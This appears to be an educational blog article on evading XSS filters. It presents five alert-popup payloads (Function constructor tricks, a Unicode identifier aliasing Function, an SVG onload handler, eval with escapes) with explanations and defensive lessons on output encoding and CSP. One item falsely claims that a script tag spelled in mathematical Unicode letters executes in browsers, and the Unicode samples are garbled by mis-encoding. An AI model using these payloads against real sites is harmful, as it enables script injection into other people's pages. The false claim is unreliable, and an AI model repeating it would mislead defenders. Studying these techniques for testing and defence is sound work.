### Advanced XSS Obfuscation with Unicode and Mathematical Operators

Cross-Site Scripting (XSS) remains one of the most common vulnerabilities in web applications. While many developers rely on simple blacklists or input sanitization to block `<script>` tags and suspicious keywords, attackers often exploit Unicode, JavaScript quirks, and alternative syntaxes to bypass such defenses.

In this article, we‚Äôll dive deep into **Unicode-powered and math-symbol obfuscated XSS payloads** that still execute in modern browsers, despite basic protections. This post serves as a research and educational demonstration, highlighting why secure coding practices and proper output encoding are essential.

## ‚ö° Why Unicode in JavaScript?
JavaScript supports a vast range of Unicode characters, including **mathematical symbols, full-width forms, homoglyphs, and encoded escapes**. This allows attackers to craft payloads that look harmless or even unreadable, but still execute as valid code.

For example, the string `alert(1)` can be disguised using Unicode homoglyphs or mathematical operators, tricking weak filters.

## üß™ Payload Examples

Below are different obfuscated XSS payloads that bypass naive filters. All will trigger a popup showing **NullSecurityX**.

### 1. Function Constructor Abuse
```javascript
[]["filter"]["constructor"]("alert('NullSecurityX')")()
```

Explanation:
- `[]["filter"]` accesses the `filter` function from an array prototype.
- Its `constructor` is the `Function` object.
- Passing a string to `Function()` dynamically executes JavaScript.

---

### 2. Unicode Variable Assignment
```javascript
ùìï = Function; ùìï("alert('NullSecurityX')")()
```

Explanation:
- `ùìï` is a Unicode character (Mathematical Script Capital F).
- Equivalent to using `var F = Function;`
- Calls `alert` without writing the keyword directly.

---

### 3. Obfuscated `<script>` Tag
```html
<ùìàùí∏ùìáùíæùìÖùìâ>alert('NullSecurityX')</ùìàùí∏ùìáùíæùìÖùìâ>
```

Explanation:
- `<script>` tag is spelled with **mathematical Unicode characters** that still render as valid script tags in some browsers.
- Many filters that only look for `<script>` in plain ASCII fail here.

---

### 4. SVG Event Handler
```html
<svg onload=alert('NullSecurityX')></svg>
```

Explanation:
- Even when `<script>` is blocked, many browsers execute **SVG event handlers**.
- Here, `onload` runs as soon as the SVG element is parsed.

---

### 5. Encoded Character Injection
```javascript
eval("\u0061lert('NullSecurityX')")
```

Explanation:
- `\u0061` is Unicode for the letter `a`, so it reconstructs `alert` at runtime.
- Simple signature-based detection for ‚Äúalert(‚Äù won‚Äôt catch this.

## üîí Lessons Learned

1. **Blacklists are useless.** Attackers can use Unicode, obfuscation, and alternative JavaScript object properties to evade them.
2. **Always use output encoding.** Encode untrusted data before inserting it into HTML, JavaScript, or attributes.
3. **Use Content Security Policy (CSP).** Strong CSP rules can block inline scripts and mitigate XSS even if payloads are injected.
4. **Test with advanced payloads.** Security testing should include not only classic `<script>alert(1)</script>` but also obfuscated/unicode versions.
